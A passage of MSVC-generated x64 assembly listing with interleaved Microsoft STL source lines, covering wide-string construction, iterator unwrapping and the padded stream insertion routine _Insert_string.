??$_Construct@$00PEA_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEA_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t *>, COMDAT

; 2672 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN7:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 2673 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2674 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2675 :         } else {
; 2676 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2677 :         }
; 2678 : 
; 2679 :         if (_Count > max_size()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	cmp	QWORD PTR _Count$[rsp], rax
	jbe	SHORT $LN2@Construct

; 2680 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Construct:

; 2681 :         }
; 2682 : 
; 2683 :         auto& _My_data  = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 2684 :         auto& _Al       = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 2685 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

	lea	rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	QWORD PTR _Alproxy$[rsp], rax

; 2686 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

	mov	r8, QWORD PTR _My_data$[rsp]
	mov	rdx, QWORD PTR _Alproxy$[rsp]
	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2687 : 
; 2688 : #if _HAS_CXX20
; 2689 :         if (_STD is_constant_evaluated()) {
; 2690 :             _My_data._Myres = _BUF_SIZE; // TRANSITION: constexpr SSO
; 2691 :         }
; 2692 : 
; 2693 :         const bool _Stay_small = _Count < _BUF_SIZE && !_STD is_constant_evaluated();
; 2694 : #else // ^^^ _HAS_CXX20 / !_HAS_CXX20 vvv
; 2695 :         const bool _Stay_small = _Count < _BUF_SIZE;

	cmp	QWORD PTR _Count$[rsp], 8
	jae	SHORT $LN5@Construct
	mov	BYTE PTR tv79[rsp], 1
	jmp	SHORT $LN6@Construct
$LN5@Construct:
	mov	BYTE PTR tv79[rsp], 0
$LN6@Construct:
	movzx	eax, BYTE PTR tv79[rsp]
	mov	BYTE PTR _Stay_small$[rsp], al

; 2696 : #endif // _HAS_CXX20
; 2697 : 
; 2698 :         if (_Stay_small) {

	movzx	eax, BYTE PTR _Stay_small$[rsp]
	test	eax, eax
	je	SHORT $LN3@Construct

; 2699 : #if _HAS_CXX20
; 2700 :             // TRANSITION: This is currently unused until SSO support is merged
; 2701 :             if (_STD is_constant_evaluated()) {
; 2702 :                 _Construct_in_place(_My_data._Bx);
; 2703 :             }
; 2704 : #endif // _HAS_CXX20
; 2705 : 
; 2706 :             _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2707 :             _My_data._Myres  = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 7

; 2708 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2709 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2710 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2711 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2712 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Arg$[rsp]
	mov	rcx, rax
	call	?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move

; 2713 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

	xor	eax, eax
	mov	WORD PTR $T1[rsp], ax
	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2714 :             } else { // _Strat == _Construct_strategy::_From_string
; 2715 : #ifdef _INSERT_STRING_ANNOTATION
; 2716 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);
; 2717 : #else // ^^^ _INSERT_STRING_ANNOTATION ^^^ // vvv !_INSERT_STRING_ANNOTATION vvv
; 2718 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2719 : #endif // !_INSERT_STRING_ANNOTATION
; 2720 :             }
; 2721 : 
; 2722 :             _ASAN_STRING_CREATE(*this);
; 2723 :             _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2724 :             return;

	jmp	$LN1@Construct
$LN3@Construct:

; 2725 :         }
; 2726 : 
; 2727 :         _My_data._Myres               = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 7

; 2728 :         const size_type _New_capacity = _Calculate_growth(_Count);

	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	mov	QWORD PTR _New_capacity$[rsp], rax

; 2729 :         const pointer _New_ptr        = _Al.allocate(_New_capacity + 1); // throws

	mov	rax, QWORD PTR _New_capacity$[rsp]
	inc	rax
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ; std::allocator<wchar_t>::allocate
	mov	QWORD PTR _New_ptr$[rsp], rax

; 2730 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	lea	rdx, QWORD PTR _New_ptr$[rsp]
	mov	rcx, rax
	call	??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>

; 2731 : 
; 2732 : #if _HAS_CXX20
; 2733 :         if (_STD is_constant_evaluated()) { // Begin the lifetimes of the objects before copying to avoid UB
; 2734 :             _Traits::assign(_Unfancy(_New_ptr), _New_capacity + 1, _Elem());
; 2735 :         }
; 2736 : #endif // _HAS_CXX20
; 2737 : 
; 2738 :         _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2739 :         _My_data._Myres  = _New_capacity;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_capacity$[rsp]
	mov	QWORD PTR [rax+24], rcx

; 2740 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2741 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2742 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2743 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2744 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);

	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z	; std::_Unfancy<wchar_t>
	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Arg$[rsp]
	mov	rcx, rax
	call	?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2745 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

	xor	eax, eax
	mov	WORD PTR $T2[rsp], ax
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z	; std::_Unfancy<wchar_t>
	mov	rcx, QWORD PTR _Count$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	lea	rdx, QWORD PTR $T2[rsp]
	mov	rcx, rax
	call	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2746 :         } else { // _Strat == _Construct_strategy::_From_string
; 2747 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);
; 2748 :         }
; 2749 : 
; 2750 :         _ASAN_STRING_CREATE(*this);
; 2751 :         _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:
$LN4@Construct:

; 2752 :     }

	add	rsp, 104				; 00000068H
	ret	0
??$_Construct@$00PEA_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEA_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Get_unwrapped@AEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@@Z
_TEXT	SEGMENT
_It$ = 48
??$_Get_unwrapped@AEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@@Z PROC ; std::_Get_unwrapped<std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > > &>, COMDAT

; 1347 : _NODISCARD constexpr decltype(auto) _Get_unwrapped(_Iter&& _It) {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 1348 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1349 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1350 :         return _It + 0;
; 1351 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1352 :         return static_cast<_Iter&&>(_It)._Unwrapped();

	mov	rcx, QWORD PTR _It$[rsp]
	call	?_Unwrapped@?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ ; std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >::_Unwrapped

; 1353 :     } else {
; 1354 :         return static_cast<_Iter&&>(_It);
; 1355 :     }
; 1356 : }

	add	rsp, 40					; 00000028H
	ret	0
??$_Get_unwrapped@AEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@@Z ENDP ; std::_Get_unwrapped<std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > > &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Adl_verify_range@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@V12@@std@@YAXAEBV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@0@Z
_TEXT	SEGMENT
_First$ = 8
_Last$ = 16
??$_Adl_verify_range@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@V12@@std@@YAXAEBV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@0@Z PROC ; std::_Adl_verify_range<std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >,std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > > >, COMDAT

; 1331 : constexpr void _Adl_verify_range(const _Iter& _First, const _Sentinel& _Last) {

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 1332 :     // check that [_First, _Last) forms an iterator range
; 1333 :     if constexpr (_Range_verifiable_v<_Iter, _Sentinel>) {
; 1334 :         _Verify_range(_First, _Last);
; 1335 :     }
; 1336 : }

	ret	0
??$_Adl_verify_range@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@V12@@std@@YAXAEBV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@0@Z ENDP ; std::_Adl_verify_range<std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >,std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 48
__formal$ = 56
_Val1$ = 64
??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>, COMDAT

; 1380 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR _Val1$[rsp]
	call	??$forward@AEBV?$allocator@_W@std@@@std@@YAAEBV?$allocator@_W@0@AEBV10@@Z ; std::forward<std::allocator<wchar_t> const &>
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z
_TEXT	SEGMENT
_State$ = 32
tv290 = 36
tv292 = 38
$T1 = 40
$T2 = 42
tv295 = 44
tv297 = 46
$T3 = 48
$T4 = 50
_Pad$ = 56
tv136 = 64
tv291 = 72
tv293 = 80
tv294 = 88
tv296 = 96
$T5 = 104
_Ok$ = 112
_Ostr$ = 144
_Data$ = 152
_Size$ = 160
??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z PROC ; std::_Insert_string<wchar_t,std::char_traits<wchar_t>,unsigned __int64>, COMDAT

; 489  :     basic_ostream<_Elem, _Traits>& _Ostr, const _Elem* const _Data, const _SizeT _Size) {

$LN26:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 136				; 00000088H

; 490  :     // insert a character-type sequence into _Ostr as if through a basic_string copy
; 491  :     using _Ostr_t                    = basic_ostream<_Elem, _Traits>;
; 492  :     typename _Ostr_t::iostate _State = _Ostr_t::goodbit;

	mov	DWORD PTR _State$[rsp], 0

; 493  : 
; 494  :     _SizeT _Pad;
; 495  :     if (_Ostr.width() <= 0 || static_cast<_SizeT>(_Ostr.width()) <= _Size) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	test	rax, rax
	jle	SHORT $LN10@Insert_str
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	cmp	rax, QWORD PTR _Size$[rsp]
	ja	SHORT $LN8@Insert_str
$LN10@Insert_str:

; 496  :         _Pad = 0;

	mov	QWORD PTR _Pad$[rsp], 0

; 497  :     } else {

	jmp	SHORT $LN9@Insert_str
$LN8@Insert_str:

; 498  :         _Pad = static_cast<_SizeT>(_Ostr.width()) - _Size;

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	sub	rax, QWORD PTR _Size$[rsp]
	mov	QWORD PTR _Pad$[rsp], rax
$LN9@Insert_str:

; 499  :     }
; 500  : 
; 501  :     const typename _Ostr_t::sentry _Ok(_Ostr);

	mov	rdx, QWORD PTR _Ostr$[rsp]
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::sentry
	npad	1

; 502  : 
; 503  :     if (!_Ok) {

	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??Bsentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEBA_NXZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::operator bool
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN11@Insert_str

; 504  :         _State |= _Ostr_t::badbit;

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax

; 505  :     } else { // state okay, insert characters

	jmp	$LN12@Insert_str
$LN11@Insert_str:

; 506  :         _TRY_IO_BEGIN
; 507  :         if ((_Ostr.flags() & _Ostr_t::adjustfield) != _Ostr_t::left) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	mov	DWORD PTR tv136[rsp], eax
	mov	eax, DWORD PTR tv136[rsp]
	and	eax, 448				; 000001c0H
	cmp	eax, 64					; 00000040H
	je	$LN14@Insert_str

; 508  :             for (; 0 < _Pad; --_Pad) { // pad on left

	jmp	SHORT $LN4@Insert_str
$LN2@Insert_str:
	mov	rax, QWORD PTR _Pad$[rsp]
	dec	rax
	mov	QWORD PTR _Pad$[rsp], rax
$LN4@Insert_str:
	cmp	QWORD PTR _Pad$[rsp], 0
	jbe	$LN14@Insert_str

; 509  :                 if (_Traits::eq_int_type(_Traits::eof(), _Ostr.rdbuf()->sputc(_Ostr.fill()))) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?fill@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBA_WXZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::fill
	mov	WORD PTR tv290[rsp], ax
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
	mov	QWORD PTR tv291[rsp], rax
	movzx	edx, WORD PTR tv290[rsp]
	mov	rcx, QWORD PTR tv291[rsp]
	call	?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputc
	mov	WORD PTR tv292[rsp], ax
	movzx	eax, WORD PTR tv292[rsp]
	mov	WORD PTR $T1[rsp], ax
	call	?eof@?$_WChar_traits@_W@std@@SAGXZ	; std::_WChar_traits<wchar_t>::eof
	mov	WORD PTR $T2[rsp], ax
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR $T2[rsp]
	call	?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z ; std::_WChar_traits<wchar_t>::eq_int_type
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN15@Insert_str

; 510  :                     _State |= _Ostr_t::badbit; // insertion failed, quit

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax

; 511  :                     break;

	jmp	SHORT $LN14@Insert_str
$LN15@Insert_str:

; 512  :                 }
; 513  :             }

	jmp	$LN2@Insert_str
$LN14@Insert_str:

; 514  :         }
; 515  : 
; 516  :         if (_State == _Ostr_t::goodbit
; 517  :             && _Ostr.rdbuf()->sputn(_Data, static_cast<streamsize>(_Size)) != static_cast<streamsize>(_Size)) {

	cmp	DWORD PTR _State$[rsp], 0
	jne	SHORT $LN16@Insert_str
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
	mov	QWORD PTR tv293[rsp], rax
	mov	r8, QWORD PTR _Size$[rsp]
	mov	rdx, QWORD PTR _Data$[rsp]
	mov	rcx, QWORD PTR tv293[rsp]
	call	?sputn@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAA_JPEB_W_J@Z ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputn
	mov	QWORD PTR tv294[rsp], rax
	mov	rax, QWORD PTR _Size$[rsp]
	cmp	QWORD PTR tv294[rsp], rax
	je	SHORT $LN16@Insert_str

; 518  :             _State |= _Ostr_t::badbit;

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax

; 519  :         } else {

	jmp	$LN17@Insert_str
$LN16@Insert_str:

; 520  :             for (; 0 < _Pad; --_Pad) { // pad on right

	jmp	SHORT $LN7@Insert_str
$LN5@Insert_str:
	mov	rax, QWORD PTR _Pad$[rsp]
	dec	rax
	mov	QWORD PTR _Pad$[rsp], rax
$LN7@Insert_str:
	cmp	QWORD PTR _Pad$[rsp], 0
	jbe	$LN17@Insert_str

; 521  :                 if (_Traits::eq_int_type(_Traits::eof(), _Ostr.rdbuf()->sputc(_Ostr.fill()))) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?fill@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBA_WXZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::fill
	mov	WORD PTR tv295[rsp], ax
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
	mov	QWORD PTR tv296[rsp], rax
	movzx	edx, WORD PTR tv295[rsp]
	mov	rcx, QWORD PTR tv296[rsp]
	call	?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputc
	mov	WORD PTR tv297[rsp], ax
	movzx	eax, WORD PTR tv297[rsp]
	mov	WORD PTR $T3[rsp], ax
	call	?eof@?$_WChar_traits@_W@std@@SAGXZ	; std::_WChar_traits<wchar_t>::eof
	mov	WORD PTR $T4[rsp], ax
	lea	rdx, QWORD PTR $T3[rsp]
	lea	rcx, QWORD PTR $T4[rsp]
	call	?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z ; std::_WChar_traits<wchar_t>::eq_int_type
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN18@Insert_str

; 522  :                     _State |= _Ostr_t::badbit; // insertion failed, quit

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax

; 523  :                     break;

	jmp	SHORT $LN17@Insert_str
$LN18@Insert_str:

; 524  :                 }
; 525  :             }

	jmp	$LN5@Insert_str
$LN17@Insert_str:

; 526  :         }
; 527  : 
; 528  :         _Ostr.width(0);

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	edx, edx
	mov	rcx, rax
	call	?width@ios_base@std@@QEAA_J_J@Z		; std::ios_base::width
	npad	1
	jmp	SHORT $LN12@Insert_str
$LN24@Insert_str:
$LN12@Insert_str:

; 529  :         _CATCH_IO_(_Ostr_t, _Ostr)
; 530  :     }
; 531  : 
; 532  :     _Ostr.setstate(_State);

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	r8d, r8d
	mov	edx, DWORD PTR _State$[rsp]
	mov	rcx, rax
	call	?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::setstate

; 533  :     return _Ostr;

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	QWORD PTR $T5[rsp], rax
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::~sentry
	mov	rax, QWORD PTR $T5[rsp]

; 534  : }

	add	rsp, 136				; 00000088H
	ret	0
